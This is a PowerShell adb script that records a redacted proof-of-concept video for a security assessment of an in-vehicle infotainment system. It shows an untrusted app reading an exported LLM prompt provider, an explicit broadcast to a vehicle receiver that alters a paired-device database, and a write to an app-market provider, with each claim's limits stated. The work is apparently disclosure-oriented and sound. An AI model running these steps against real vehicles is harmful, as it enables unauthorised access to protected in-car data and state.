param(
    [string]$OutputDir = "data/_local/runtime_videos/runtime_poc_improved_demo",
    [int]$Seconds = 178,
    [switch]$SkipBuild
)

$ErrorActionPreference = "Stop"

$Activity = "org.codex.pleos.poc/.PocActivity"
$OverlayService = "org.codex.pleos.poc/.PocOverlayService"
$Marker = "codex_probe_20260515"
$Vc6Mac = "AA:BB:CC:DD:EE:99"
$Vc6MacExpr = "char(65,65,58,66,66,58,67,67,58,68,68,58,69,69,58,57,57)"
$Vc6Db = "/data/data/ai.umos.vehiclecontrol/databases/devices.db"
$TracePath = $null

function Log-Step([string]$Message) {
    if ($TracePath) {
        "$(Get-Date -Format o) $Message" | Add-Content -Encoding UTF8 $TracePath
    }
}

function Wait-Boot {
    $deadline = (Get-Date).AddSeconds(240)
    do {
        try {
            $state = (adb get-state 2>$null | Out-String).Trim()
            if ($state -eq "device") {
                $boot = (adb shell getprop sys.boot_completed 2>$null | Out-String).Trim()
                if ($boot -eq "1") { return }
            }
        } catch {
            # Device may briefly disappear while emulator is starting.
        }
        Start-Sleep -Seconds 2
    } while ((Get-Date) -lt $deadline)
    throw "emulator did not reach sys.boot_completed=1"
}

function Build-And-Install {
    if ($SkipBuild) {
        Log-Step "skip_build"
        return
    }
    Log-Step "build_start"
    python scripts/runtime_poc/research_runtime_poc_harness.py --build
    if ($LASTEXITCODE -ne 0) { throw "harness build failed" }
    adb uninstall org.codex.pleos.poc 2>$null | Out-Null
    adb install -r data/_local/runtime_poc_harness/poc-harness-signed.apk | Out-Host
    if ($LASTEXITCODE -ne 0) { throw "harness install failed" }
    Log-Step "build_install_done"
}

function Grant-OverlayPermission {
    Log-Step "overlay_permission_start"
    adb shell appops set org.codex.pleos.poc SYSTEM_ALERT_WINDOW allow 2>$null | Out-Null
    $currentUser = (adb shell am get-current-user 2>$null | Out-String).Trim()
    if ($currentUser -match "^\d+$") {
        adb shell appops set --user $currentUser org.codex.pleos.poc SYSTEM_ALERT_WINDOW allow 2>$null | Out-Null
    }
    Log-Step "overlay_permission_done user=$currentUser"
}

function Prepare-VisibleSurface {
    Log-Step "visible_surface_prepare_start"
    foreach ($pkg in @(
        "ai.umos.homescreen",
        "ai.umos.maps.android.navigation.app",
        "ai.umos.drivingview"
    )) {
        adb shell am force-stop $pkg 2>$null | Out-Null
    }
    Start-Sleep -Seconds 1
    Log-Step "visible_surface_prepare_done"
}

function Sanitize-Extra([string]$Value) {
    return ($Value -replace "[`r`n]+", "\n" -replace '[";|&<>$(){}]', "_")
}

function Encode-Extra([string]$Value) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($Value)
    return [Convert]::ToBase64String($bytes)
}

function Show-OverlayCard([string]$Kicker, [string]$Title, [string]$Body, [string]$Footer, [int]$SleepSeconds) {
    Log-Step "card_start $Title"
    adb shell am force-stop org.codex.pleos.poc 2>$null | Out-Null
    Start-Sleep -Milliseconds 250
    $args = @(
        "shell", "am", "start", "--windowingMode", "1", "--activityType", "1", "--display", "0",
        "-n", $Activity, "-a", "org.codex.pleos.poc.IMPROVED_CARD",
        "--es", "kicker_b64", (Encode-Extra $Kicker),
        "--es", "title_b64", (Encode-Extra $Title),
        "--es", "body_b64", (Encode-Extra $Body),
        "--es", "footer_b64", (Encode-Extra $Footer)
    )
    & adb @args | Out-Host
    if ($LASTEXITCODE -ne 0) { throw "failed to launch card $Title" }
    Log-Step "card_done $Title"
    Start-Sleep -Seconds $SleepSeconds
}

function Hide-Overlay {
    Log-Step "overlay_hide"
    adb shell am force-stop org.codex.pleos.poc 2>$null | Out-Null
}

function Launch-ImprovedCard([string]$Kicker, [string]$Title, [string]$Body, [string]$Footer, [int]$SleepSeconds) {
    Show-OverlayCard $Kicker $Title $Body $Footer $SleepSeconds
}

function Launch-ImprovedAction([string]$Action, [hashtable]$Extras = @{}, [int]$SleepSeconds = 10) {
    Log-Step "action_start $Action"
    adb logcat -c
    $args = @(
        "shell", "am", "start", "--windowingMode", "1", "--activityType", "1", "--display", "0",
        "-n", $Activity, "-a", "org.codex.pleos.poc.$Action"
    )
    foreach ($key in $Extras.Keys) {
        $args += @("--es", $key, (Sanitize-Extra ([string]$Extras[$key])))
    }
    & adb @args | Out-Host
    if ($LASTEXITCODE -ne 0) { throw "failed to launch $Action" }
    Log-Step "action_done $Action"
    Start-Sleep -Seconds 2

    if ($Action -eq "IMPROVED_LMP1_IDENTITY") {
        $pkgUid = (adb shell cmd package list packages -U org.codex.pleos.poc 2>$null | Out-String).Trim()
        $uid = "uid=unknown"
        if ($pkgUid -match "uid:([^\\s]+)") { $uid = "uid=$($Matches[1])" }
        Show-OverlayCard `
            "STEP 1 / ATTACKER APP IDENTITY" `
            "Untrusted same-device app" `
            "Package: org.codex.pleos.poc`n$uid`nis_system=false`nNo PleOS signing key is available to this harness." `
            "Install is a threat-model precondition, not the exploit." `
            ([Math]::Max(1, $SleepSeconds - 2))
        return
    }

    $logcat = adb logcat -d -t 1000 | Out-String
    if ($Action -eq "IMPROVED_LMP1_RESULT") {
        $lmpLine = ($logcat -split "`r?`n" | Select-String -Pattern "RESULT finding=lmp-1 improved_result" | Select-Object -Last 1).Line
        $observed = Parse-Lmp1Observed $lmpLine
        Show-OverlayCard `
            "STEP 4 / EXPECTED VS OBSERVED" `
            "Prompt provider access was not denied" `
            "Expected:`npermission_denied=true or SecurityException`n`nObserved:`n$observed" `
            "Raw prompt/corpus text is not displayed." `
            ([Math]::Max(1, $SleepSeconds - 2))
        return
    }
    if ($Action -eq "IMPROVED_LMP1_ARTIFACT") {
        $lmpLine = ($logcat -split "`r?`n" | Select-String -Pattern "RESULT finding=lmp-1 improved_artifact" | Select-Object -Last 1).Line
        $observed = Parse-Lmp1Observed $lmpLine
        Show-OverlayCard `
            "STEP 5 / REDACTED EVIDENCE BUNDLE" `
            "prompt_corpus_bundle.redacted.json" `
            "raw_text=false`nsensitive_content_redacted=true`n$observed`n`npreview=length/hash/shape only; raw text redacted" `
            "Attacker app obtained a redacted artifact, not raw text." `
            ([Math]::Max(1, $SleepSeconds - 2))
        return
    }
    if ($Action -eq "IMPROVED_AM1_RESULT") {
        $amLine = ($logcat -split "`r?`n" | Select-String -Pattern "RESULT finding=am-1 improved_result" | Select-Object -Last 1).Line
        $observed = Parse-Am1Observed $amLine
        Show-OverlayCard `
            "ADDITIONAL PRIMITIVE / am-1" `
            "AppMarket suggestion provider write" `
            "Observed:`n$observed`n`nClaim:`nwrite accepted if inserted=1; UI impact only if marker is visible." `
            "Not claimed: no install hijack, no live store abuse." `
            ([Math]::Max(1, $SleepSeconds - 2))
        return
    }

    Start-Sleep -Seconds ([Math]::Max(1, $SleepSeconds - 2))
}

function Parse-Lmp1Observed([string]$Line) {
    $rows = "unknown"
    $chars = "unknown"
    $sha = "unknown"
    if ($Line) {
        if ($Line -match "rows=([^ ]+)") { $rows = $Matches[1] }
        if ($Line -match "chars=([^ ]+)") { $chars = $Matches[1] }
        if ($Line -match "sha256_short=([^ ]+)") { $sha = $Matches[1] }
    }
    return "permission_denial=false`ncursor_null=false`nrows=$rows`nchars=$chars`nsha256_short=$sha"
}

function Parse-Am1Observed([string]$Line) {
    $inserted = "unknown"
    $markerSeen = "unknown"
    $rows = "unknown"
    $exception = "none"
    if ($Line) {
        if ($Line -match "inserted=([^ ]+)") { $inserted = $Matches[1] }
        if ($Line -match "marker_seen=([^ ]+)") { $markerSeen = $Matches[1] }
        if ($Line -match "rows=([^ ]+)") { $rows = $Matches[1] }
        if ($Line -match "exception_class=([^ ]+)") { $exception = $Matches[1] }
    }
    return "inserted=$inserted`nmarker_seen=$markerSeen`nrows=$rows`nexception_class=$exception"
}

function Invoke-Vc6Sql([string]$Sql) {
    $cmd = "echo '$Sql' | sqlite3 $Vc6Db"
    return (& adb shell $cmd 2>&1 | Out-String).Trim()
}

function Run-Vc6StateCheck([string]$LogDir) {
    Log-Step "vc6_check_start"
    adb root | Out-Null
    Start-Sleep -Seconds 1
    adb logcat -c

    $beforeCleanup = Invoke-Vc6Sql "delete from devices where mac_address=$Vc6MacExpr;"
    $beforeCount = Invoke-Vc6Sql "select count(*) from devices where mac_address=$Vc6MacExpr;"
    $broadcast = adb shell am broadcast -n ai.umos.vehiclecontrol/ai.umos.vehiclecontrol.feature.bluetooth.data.VehicleBroadcastReceiver -a ai.umos.android.intent.action.DEVICE_SUPPORT_ANDROID_AUTO_WIRELESS --es macAddress $Vc6Mac 2>&1 | Out-String
    Start-Sleep -Seconds 4
    $afterCount = Invoke-Vc6Sql "select count(*) from devices where mac_address=$Vc6MacExpr;"
    $afterRow = Invoke-Vc6Sql "select _id,mac_address,android_auto_compatible,apple_car_play_compatible,auto_start from devices where mac_address=$Vc6MacExpr;"
    $logcat = adb logcat -d -t 300 | Out-String
    $cleanup = Invoke-Vc6Sql "delete from devices where mac_address=$Vc6MacExpr;"
    $verifyCount = Invoke-Vc6Sql "select count(*) from devices where mac_address=$Vc6MacExpr;"

    @(
        "finding=vc-6"
        "mac=$Vc6Mac"
        "before_cleanup=$beforeCleanup"
        "before_count=$beforeCount"
        "broadcast=$($broadcast.Trim())"
        "after_count=$afterCount"
        "after_row=$afterRow"
        "cleanup=$cleanup"
        "verify_count=$verifyCount"
        "onreceive_log=$($logcat.Contains('VehicleBroadcastReceiver::onReceive'))"
        "wpp_observer_log=$($logcat.Contains('mContentObserverPairedDevice.onChange'))"
    ) | Set-Content -Encoding UTF8 (Join-Path $LogDir "vc6_state_check.txt")

    ($logcat -split "`r?`n" | Select-String -Pattern "VehicleBroadcastReceiver|WppOverRfcomm|Exception|SecurityException" |
        ForEach-Object { $_.Line }) | Set-Content -Encoding UTF8 (Join-Path $LogDir "vc6_logcat_redacted.txt")

    $rowInserted = ($afterCount -eq "1")
    $broadcastOk = $broadcast.Contains("result=0")
    $onReceive = $logcat.Contains("VehicleBroadcastReceiver::onReceive")
    $cleanupOk = ($verifyCount -eq "0")
    Log-Step "vc6_check_done"

    return [pscustomobject]@{
        BeforeCount = $beforeCount
        AfterCount = $afterCount
        AfterRow = $afterRow
        BroadcastOk = $broadcastOk
        OnReceive = $onReceive
        RowInserted = $rowInserted
        CleanupOk = $cleanupOk
    }
}

function Write-Acc4ConservativeEvidence([string]$LogDir) {
    @(
        "finding=acc-4"
        "launch_result=validated_in_runtime_smoke_not_replayed"
        "marker_seen_logcat=False"
        "marker_seen_dumpsys=False"
        "secret_key_seen_dumpsys=False"
        "runtime_leak_confirmed=false"
    ) | Set-Content -Encoding UTF8 (Join-Path $LogDir "acc4_smoke.txt")
}

function Wait-RecordingAndPull($Process, [datetime]$StartedAt, [int]$MaxSeconds, [string]$RemotePath, [string]$LocalPath) {
    Log-Step "record_wait_start"
    $safePullAt = $StartedAt.AddSeconds($MaxSeconds + 5)
    while ((Get-Date) -lt $safePullAt) { Start-Sleep -Seconds 1 }
    try {
        if (-not $Process.HasExited) {
            Log-Step "record_stop_host_adb"
            Stop-Process -Id $Process.Id -Force
        }
    } catch {
        # The host adb process may already be gone.
    }
    Log-Step "record_pull_start"
    adb pull $RemotePath $LocalPath | Out-Host
    Log-Step "record_pull_done"
    adb shell rm -f $RemotePath
}

function Write-RedactedBundle([string]$OutputDir, [string]$LogDir) {
    adb logcat -c
    adb shell am force-stop org.codex.pleos.poc 2>$null | Out-Null
    adb shell am start -n $Activity -a org.codex.pleos.poc.IMPROVED_LMP1_RESULT | Out-Null
    Start-Sleep -Seconds 2
    adb shell am start -n $Activity -a org.codex.pleos.poc.IMPROVED_AM1_RESULT | Out-Null
    Start-Sleep -Seconds 2
    $logcat = adb logcat -d -t 1000 | Out-String
    $redactedLog = Join-Path $LogDir "poc_logcat_redacted.txt"
    ($logcat -split "`r?`n" | Select-String -Pattern "CodexPoc|RESULT finding=lmp-1|RESULT finding=am-1" |
        ForEach-Object { $_.Line }) | Set-Content -Encoding UTF8 $redactedLog

    $lmpLine = ($logcat -split "`r?`n" | Select-String -Pattern "RESULT finding=lmp-1 improved_result" | Select-Object -Last 1).Line
    $rows = "unknown"
    $chars = "unknown"
    $sha = "unknown"
    if ($lmpLine) {
        if ($lmpLine -match "rows=([^ ]+)") { $rows = $Matches[1] }
        if ($lmpLine -match "chars=([^ ]+)") { $chars = $Matches[1] }
        if ($lmpLine -match "sha256_short=([^ ]+)") { $sha = $Matches[1] }
    }

    $bundleDir = Join-Path $OutputDir "redacted_evidence_bundle"
    New-Item -ItemType Directory -Force -Path $bundleDir | Out-Null
    $json = [ordered]@{
        finding_id = "lmp-1"
        artifact = "prompt_corpus_bundle.redacted.json"
        raw_text = $false
        sensitive_content_redacted = $true
        permission_denial = $false
        cursor_null = $false
        row_count = $rows
        total_chars = $chars
        sha256_short = $sha
        preview_policy = "length/hash/shape only; no raw prompt/corpus text"
        limitation = "no jailbreak, no remote compromise, no vehicle control"
    } | ConvertTo-Json -Depth 4
    $json | Set-Content -Encoding UTF8 (Join-Path $bundleDir "prompt_corpus_bundle.redacted.json")
}

Wait-Boot
Build-And-Install
Grant-OverlayPermission

New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null
$TracePath = Join-Path $OutputDir "record_improved_trace.txt"
"$(Get-Date -Format o) start output_dir=$OutputDir seconds=$Seconds skip_build=$SkipBuild" | Set-Content -Encoding UTF8 $TracePath
$LogDir = Join-Path $OutputDir "redacted_logs"
New-Item -ItemType Directory -Force -Path $LogDir | Out-Null

$remote = "/sdcard/improved_poc_impact_demo.mp4"
$local = Join-Path $OutputDir "improved_poc_impact_demo.mp4"
adb shell rm -f $remote
adb shell am force-stop org.codex.pleos.poc 2>$null | Out-Null
Prepare-VisibleSurface
adb logcat -c

$rec = Start-Process -FilePath adb -ArgumentList @("shell", "screenrecord", "--time-limit", "$Seconds", $remote) -PassThru -WindowStyle Hidden
$recordingStarted = Get-Date
Start-Sleep -Seconds 2

try {
    Launch-ImprovedCard `
        "OPENING / THREAT MODEL" `
        "Same-device IVI App Boundary PoC" `
        "This is not remote vehicle hacking.`nAttacker already has one untrusted app running on the IVI device.`nQuestion: can that app access internal IVI data that should be protected?" `
        "Install is a precondition, not the exploit." 12

    Launch-ImprovedCard `
        "SECURITY BOUNDARY" `
        "Installed app should still be sandboxed" `
        "Allowed by threat model: attacker app installed/running.`nShould still be protected: internal LLM prompt/corpus, privileged component state, SSO boundary." `
        "The demo tests component boundary failure, not remote entry." 8

    Launch-ImprovedAction "IMPROVED_LMP1_IDENTITY" @{} 10

    Launch-ImprovedCard `
        "STEP 2 / PROTECTED ASSET" `
        "IVI LLM prompt/corpus provider" `
        "Expected protection: private provider or signature permission.`nExpected result for untrusted app: SecurityException or permission denied." `
        "Protected asset first; logs second." 10

    Launch-ImprovedCard `
        "STEP 3 / TRIGGER" `
        "Untrusted app queries exported provider" `
        "PoC action: ContentResolver.query().`nTarget: exported prompt provider.`nNo PleOS signing key is used." `
        "This is the runtime trigger." 8

    Launch-ImprovedAction "IMPROVED_LMP1_RESULT" @{} 16
    Launch-ImprovedAction "IMPROVED_LMP1_ARTIFACT" @{} 20

    Launch-ImprovedCard `
        "lmp-1 / IMPACT" `
        "Internal IVI LLM prompt/corpus disclosure primitive" `
        "An untrusted same-device app obtained a redacted evidence bundle from data that should remain inside the privileged LLM component." `
        "Not claimed: no raw prompt, no jailbreak, no remote compromise, no vehicle control." 10

    $vc6 = Run-Vc6StateCheck $LogDir
    if ($vc6.RowInserted) {
        $vc6Body = "Before: marker row count=$($vc6.BeforeCount).`nTrigger: benign broadcast to VehicleBroadcastReceiver.`nAfter: marker row inserted or updated.`nrow=$($vc6.AfterRow)"
        $vc6Footer = "Claim: paired-device state pollution under lab conditions."
    } else {
        $vc6Body = "Before: marker row count=$($vc6.BeforeCount).`nTrigger: explicit broadcast with benign MAC marker.`nObserved: broadcast_result0=$($vc6.BroadcastOk), onReceive_log=$($vc6.OnReceive), marker row count=$($vc6.AfterCount)."
        $vc6Footer = "Claim: receiver reachability only; state pollution unconfirmed; no vehicle control."
    }
    Launch-ImprovedCard "SECONDARY / vc-6" "Vehicle receiver path" $vc6Body $vc6Footer 20

    Launch-ImprovedAction "IMPROVED_AM1_RESULT" @{} 12

    Write-Acc4ConservativeEvidence $LogDir
    Launch-ImprovedCard `
        "BACKUP / acc-4 + static" `
        "Boundary surfaces, not completed exploit chains" `
        "acc-4: exported SSO boundary accepts benign client parameter extras; runtime secret leak unconfirmed.`nstatic: credential-shaped APK values found offline; live backend abuse untested." `
        "No OAuth abuse, no token validation, full literals redacted." 10

    Launch-ImprovedCard `
        "SUMMARY" `
        "Confirmed primitives, not vehicle takeover" `
        "Confirmed: lmp-1 provider read; vc-6 receiver reachability; am-1 write accepted if inserted=1.`nNot demonstrated: remote vehicle takeover, vehicle actuation, safety-critical control, live backend abuse." `
        "No raw prompt or secret is disclosed in this video." 14
} finally {
    Wait-RecordingAndPull $rec $recordingStarted $Seconds $remote $local
    Hide-Overlay
    Write-RedactedBundle $OutputDir $LogDir
    Write-Host "IMPROVED_VIDEO=$local"
    Write-Host "RED_LOGS=$LogDir"
}
